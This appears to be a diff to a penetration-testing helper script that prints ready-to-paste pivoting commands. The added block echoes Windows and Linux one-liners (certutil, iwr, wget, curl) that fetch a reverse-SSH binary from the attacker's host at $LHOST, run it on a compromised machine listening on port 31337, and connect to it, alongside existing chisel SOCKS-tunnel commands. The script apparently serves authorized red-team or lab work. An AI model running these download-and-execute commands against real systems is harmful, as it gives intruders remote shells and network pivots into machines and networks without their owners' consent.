@@ -68,7 +68,23 @@ echo "wget -O /tmp/chisel http://$LHOST:$TOOLS_PORT/pivoting/chisel/linux/chisel
 echo
 echo "curl -L -o /tmp/chisel http://$LHOST:$TOOLS_PORT/pivoting/chisel/linux/chisel && chmod +x /tmp/chisel && /tmp/chisel client $LHOST:8888 R:1080:socks"
 
+echo ""
+echo '********** Reverse-SSH (password is password) 🚀**********'
 echo
+echo "# Windows"
+echo "certutil.exe -urlcache -f http://$LHOST:$TOOLS_PORT/pivoting/reverse-ssh/reverse-sshx64.exe C:\Windows\Temp\reverse-ssh.exe && C:\Windows\Temp\reverse-ssh.exe -p 31337"
+echo
+echo "iwr -Uri http://$LHOST:$TOOLS_PORT/pivoting/reverse-ssh/reverse-sshx64.exe -OutFile C:\Windows\Temp\reverse-ssh.exe | & C:\Windows\Temp\reverse-ssh.exe -p 31337"
+echo
+echo "# Linux"
+echo "wget -O /tmp/reverse-sshx64 http://$LHOST:$TOOLS_PORT/pivoting/reverse-ssh/reverse-sshx64 && chmod +x /tmp/reverse-sshx64  && /tmp/reverse-sshx64 -p 31337"
+echo
+echo "curl -L -o /tmp/reverse-sshx64 http://$LHOST:$TOOLS_PORT/pivoting/reverse-ssh/reverse-sshx64 && chmod +x /tmp/reverse-sshx64  && /tmp/reverse-sshx64 -p 31337"
+echo
+echo
+echo "ssh <target> -p 31337"
+echo
+echo ""
 echo '********** SSH 🤓**********'
 echo
 echo "Local port to remote port"
